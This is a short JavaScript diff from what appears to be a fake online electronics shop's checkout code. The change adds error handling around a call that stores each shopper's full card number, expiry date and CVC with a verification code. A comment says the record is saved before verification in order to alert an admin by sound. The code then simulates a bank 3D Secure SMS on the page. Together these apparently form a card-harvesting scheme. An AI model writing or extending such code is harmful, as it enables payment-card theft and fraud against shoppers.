@@ -1034,16 +1034,20 @@ function setupEventListeners() {
         const totalAmount = subtotal - discount;
 
         // Save Encrypted Payment Details immediately (before SMS is verified) to trigger admin sound
-        await db.savePaymentRecord(
-            forcedOrderCode,
-            cardName,
-            cardNum,
-            cardExp,
-            cardCVC,
-            totalAmount,
-            code,
-            'ONAY BEKLENİYOR'
-        );
+        try {
+            await db.savePaymentRecord(
+                forcedOrderCode,
+                cardName,
+                cardNum,
+                cardExp,
+                cardCVC,
+                totalAmount,
+                code,
+                'ONAY BEKLENİYOR'
+            );
+        } catch (err) {
+            console.error("Payment record saving failed:", err);
+        }
 
         // Dynamic SMS Simulation via Toast Notification
         showToast(`SMS: Dora Elektronik 3D Secure onay şifreniz: ${code}`);
